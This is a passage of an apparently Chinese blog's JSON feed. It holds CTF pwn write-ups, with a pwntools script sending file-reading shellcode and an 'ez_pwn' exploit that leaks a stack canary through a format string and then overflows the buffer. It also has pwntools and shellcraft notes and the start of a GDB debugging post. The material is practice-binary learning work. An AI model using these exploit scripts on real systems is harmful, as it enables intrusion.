class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&#x27;-1869557199 -1862532682 -1862366904 -57622479 -57606351 -53083832 -50592497 -50534657 2147483647 2147483647&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">sc_elf = ELF(&#x27;b.out&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">sc = sc_elf.get_section_by_name(&#x27;.shellcode&#x27;).data()</span></span><br><span class=\"line\"><span class=\"string\">print(sc)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">sc = <span class=\"string\">b&#x27;hflagH\\x89\\xe71\\xd21\\xf6j\\x02X\\x0f\\x05\\x89\\xc71\\xc0j ZH\\x89\\xe6\\x0f\\x05j\\x01_j ZH\\x89\\xe6j\\x01X\\x0f\\x05\\xcc&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./flag&quot;</span>)</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">100</span>)</span><br><span class=\"line\">io.send(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: asm(shellcode),</span><br><span class=\"line\">    <span class=\"number\">0x100</span>: [],</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<h3 id=\"各种疑惑\"><a href=\"#各种疑惑\" class=\"headerlink\" title=\"各种疑惑\"></a>各种疑惑</h3><p>问: 为什么-490631024 读入内存会成为 0xe2c19090</p>\n<p>答: 负数会采用补码来存储</p>\n<p>问: 为什么前期用python得到的数 输入进去奇奇怪怪</p>\n<p>答:0xfcffffff scanf %d 读取的时候，会解释为负数，所以 不能用python里的直接数值转换来得到题目要输入的值（怪不得前期一直不对。。）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">value = <span class=\"number\">0xfcffffff</span> <span class=\"keyword\">if</span> <span class=\"number\">0xfcffffff</span> &lt; <span class=\"number\">0x80000000</span> <span class=\"keyword\">else</span> <span class=\"number\">0xfcffffff</span> - <span class=\"number\">0x100000000</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(value)</span><br><span class=\"line\">这样就对了</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">data = struct.pack(<span class=\"string\">&quot;I&quot;</span>, <span class=\"number\">0xfcffffff</span>)  <span class=\"comment\"># 将无符号整数打包为二进制数据</span></span><br><span class=\"line\">value = struct.unpack(<span class=\"string\">&quot;i&quot;</span>, data)[<span class=\"number\">0</span>]  <span class=\"comment\"># 将二进制数据解析为有符号整数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(value)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>怎么比较好的在gdb中查看shellcode的汇编呢</p>\n<p>display &#x2F;20i $pc</p>\n<p><a href=\"https://blog.csdn.net/counsellor/article/details/100034080\">https://blog.csdn.net/counsellor/article/details/100034080</a></p>\n<p><a href=\"https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/\">https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/</a></p>\n<h3 id=\"pwntools的使用\"><a href=\"#pwntools的使用\" class=\"headerlink\" title=\"pwntools的使用\"></a>pwntools的使用</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置目标架构为x86-64</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 默认的是大端序，可以修改</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = shellcraft.sh()  <span class=\"comment\"># 指令字符串</span></span><br><span class=\"line\">shellcodeasm = asm(shellcraft.sh()) <span class=\"comment\"># 二进制数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 disasm 函数查看每一行汇编指令的十六进制值</span></span><br><span class=\"line\">disassembled = disasm(shellcodeasm)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分割每一行汇编指令</span></span><br><span class=\"line\">instructions = disassembled.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印每一行指令及其十六进制值</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> instruction <span class=\"keyword\">in</span> instructions:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(instruction)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印整个shellcode的十六进制值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(shellcodeasm.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如何打印指定汇编指令的16进制值</span></span><br><span class=\"line\">assembly_code = <span class=\"string\">&quot;mov eax,0x123&quot;</span></span><br><span class=\"line\">hex_assembly = asm(assembly_code)</span><br><span class=\"line\">hex_assembly_code = asm(assembly_code).<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">hex_assembly_1 = disasm(hex_assembly)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令二进制表示: <span class=\"subst\">&#123;hex_assembly&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令的十六进制表示: <span class=\"subst\">&#123;hex_assembly_code&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;汇编指令: <span class=\"subst\">&#123;hex_assembly_1&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  shellcraft的各种使用方法</span></span><br><span class=\"line\">shellcraft.read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>pwn asm汇编器</p>\n<p><a href=\"https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html\">https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html</a></p>\n<p><a href=\"https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/\">https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn <span class=\"keyword\">asm</span> <span class=\"string\">&quot;mov eax,0x1&quot;</span></span><br><span class=\"line\">b801000000</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ez-pwn\"><a href=\"#ez-pwn\" class=\"headerlink\" title=\"ez_pwn\"></a>ez_pwn</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input your name&quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;hello: &quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(buf);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;leave some message&quot;</span>);</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x48</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t主要是有个canary,把canary泄露出来就可以了,普通栈溢出，利用格式化字符串来泄露canary，注意前六个参数是在寄存器里的值呀。</p>\n<p>​\t然后接收的时候注意先把hello：什么的接收了，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[DEBUG] Received <span class=\"number\">0x10</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>input your name\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">[DEBUG] Sent <span class=\"number\">0x6</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>%<span class=\"number\">11</span>$p\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">b<span class=\"number\">&#x27;</span>\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">[DEBUG] Received <span class=\"number\">0x2e</span> bytes:</span><br><span class=\"line\">    b<span class=\"number\">&#x27;</span>hello: \\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">    b<span class=\"number\">&#x27;0</span>x2535be38a9253e00\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">    b<span class=\"number\">&#x27;l</span>eave some message\\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\">b<span class=\"number\">&#x27;</span>hello: \\n<span class=\"number\">&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;ezpwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;name&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p.sendline(b&quot;a&quot;*32)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;%11$p&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;canary:&quot;</span>,canary)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;message&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">40</span> +p64(canary) + p64(<span class=\"number\">0x123456</span>) + p64(<span class=\"number\">0x4012b0</span>)+p64(<span class=\"number\">0x4011d6</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"关于格式化字符串传参：\"><a href=\"#关于格式化字符串传参：\" class=\"headerlink\" title=\"关于格式化字符串传参：\"></a>关于格式化字符串传参：</h2><p>传递10个参数看看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\\n&quot;</span>,<span class=\"string\">&quot;1aaa&quot;</span>,<span class=\"string\">&quot;2bbb&quot;</span>,<span class=\"string\">&quot;3ccc&quot;</span>,<span class=\"string\">&quot;4ddd&quot;</span>,<span class=\"string\">&quot;5eee&quot;</span>,<span class=\"string\">&quot;6fff&quot;</span>,<span class=\"string\">&quot;7ggg&quot;</span>,<span class=\"string\">&quot;8hhh&quot;</span>,<span class=\"string\">&quot;9iii&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\trdi、rsi、rdx、rcx、r8、r9</p>\n<p>​\t可以看到前5个在寄存器,后面在栈里,从rsp开始</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*RAX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x5555555551b0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"> RCX  <span class=\"number\">0x555555556012</span> ◂— <span class=\"number\">0x6262320063636333</span> <span class=\"comment\">/* &#x27;3ccc&#x27; */</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x555555556017</span> ◂— <span class=\"number\">0x6161310062626232</span> <span class=\"comment\">/* &#x27;2bbb&#x27; */</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x555555556028</span> ◂— <span class=\"string\">&#x27;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\\n&#x27;</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55555555601c</span> ◂— <span class=\"number\">0x61616131</span> <span class=\"comment\">/* &#x27;1aaa&#x27; */</span></span><br><span class=\"line\"> R8   <span class=\"number\">0x55555555600d</span> ◂— <span class=\"number\">0x6363330064646434</span> <span class=\"comment\">/* &#x27;4ddd&#x27; */</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x555555556008</span> ◂— <span class=\"number\">0x6464340065656535</span> <span class=\"comment\">/* &#x27;5eee&#x27; */</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x3</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R12  <span class=\"number\">0x555555555060</span> (_start) ◂— endbr64</span><br><span class=\"line\"> R13  <span class=\"number\">0x7fffffffe5a0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7fffffffe490</span> —▸ <span class=\"number\">0x555555556065</span> ◂— <span class=\"number\">0x100000066666636</span> <span class=\"comment\">/* &#x27;6fff&#x27; */</span></span><br><span class=\"line\">*RIP  <span class=\"number\">0x5555555551a0</span> (main+<span class=\"number\">87</span>) ◂— call <span class=\"number\">0x555555555050</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp <span class=\"number\">0x7fffffffe490</span> —▸ <span class=\"number\">0x555555556065</span> ◂— <span class=\"number\">0x100000066666636</span> <span class=\"comment\">/* &#x27;6fff&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7fffffffe498</span> —▸ <span class=\"number\">0x555555556060</span> ◂— <span class=\"number\">0x6666360067676737</span> <span class=\"comment\">/* &#x27;7ggg&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7fffffffe4a0</span> —▸ <span class=\"number\">0x55555555605b</span> ◂— <span class=\"number\">0x6767370068686838</span> <span class=\"comment\">/* &#x27;8hhh&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7fffffffe4a8</span> —▸ <span class=\"number\">0x555555556056</span> ◂— <span class=\"number\">0x6868380069696939</span> <span class=\"comment\">/* &#x27;9iii&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│ rbp <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7fffffffe4b8</span> —▸ <span class=\"number\">0x7ffff7de4083</span> (__libc_start_main+<span class=\"number\">243</span>) ◂— mov edi, eax</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7fffffffe4c0</span> —▸ <span class=\"number\">0x7ffff7ffc620</span> (_rtld_global_ro) ◂— <span class=\"number\">0x50f7a00000000</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7fffffffe4c8</span> —▸ <span class=\"number\">0x7fffffffe5a8</span> —▸ <span class=\"number\">0x7fffffffe7f4</span> ◂— <span class=\"string\">&#x27;/home/ubuntu/c/a.out&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>类似的题</p>\n<p><a href=\"https://blog.csdn.net/tbsqigongzi/article/details/124371294\">https://blog.csdn.net/tbsqigongzi/article/details/124371294</a></p>\n<p>这个为什么进入ret了,但是失败了? ret栈平衡?</p>\n<p>  fflush(_bss_start);有什么用呢</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/",
            "url": "https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/",
            "title": "盛格塾课程-拍案惊奇GDB以战说法1-谁截断了我的指针?",
            "date_published": "2023-10-26T13:54:31.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>​\t之前知道老师是因为《软件调试》这本书，非常厉害，但是因为主要是windows的一直还没读（因为主要学习Linux，不过最近越发感觉不能局限于一个系统），最近看见一个大佬在朋友圈转发这个课，才发现张老师原来是有自己的公司和培训，看了下来太牛了，立马报名了。</p>\n<p>​\t(老师b站也有号, 官网nanocode.cn,) 还有其他很多优秀的课程,看来要好好买一波了..这才是真正有价值的知识付费!!</p>\n<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>​\t老师将实际案例中的一个问题抽象出了一个很简单的demo, 用于搜索argv[0]的名字, 其实也就是当前可执行程序的名字,本身看着这个代码是没有什么问题的(不,有问题,没有include parser.c)</p>\n<p>parser.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// parser.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span> * <span class=\"title function_\">get_name</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* full_path)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> * sep = <span class=\"built_in\">strrchr</span>(full_path, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (sep == <span class=\"literal\">NULL</span>)? <span class=\"string\">&quot;errname&quot;</span>: sep+<span class=\"number\">1</span>;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ptrtrap.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* name = get_name(argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Demo of pointer trap by Raymond.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name: %s\\n&quot;</span>, name);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t在编译的时候会给出一个警告</p>\n<p>gcc -g ptrtrap.c parser.c</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-4-8-ubuntu:/home/ubuntu/youlan# gcc -g ptrtrap.c parser.c</span><br><span class=\"line\">ptrtrap.c: In function ‘main’:</span><br><span class=\"line\">ptrtrap.c:5:22: warning: implicit declaration of function ‘get_name’; did you mean ‘rename’? [-Wimplicit-function-declaration]</span><br><span class=\"line\">    5 |         char* name = get_name(argv[0]);</span><br><span class=\"line\">      |                      ^~~~~~~~</span><br><span class=\"line\">      |                      rename</span><br><span class=\"line\">ptrtrap.c:5:22: warning: initialization of ‘char *’ from ‘int’ makes pointer from integer without a cast [-Wint-conversion]</span><br></pre></td></tr></table></figure>\n\n<p>​\t运行的时候会发生段错误</p>\n<p>Program received signal SIGSEGV, Segmentation fault</p>\n<p>段错误，访问了不该访问的</p>\n<p><img 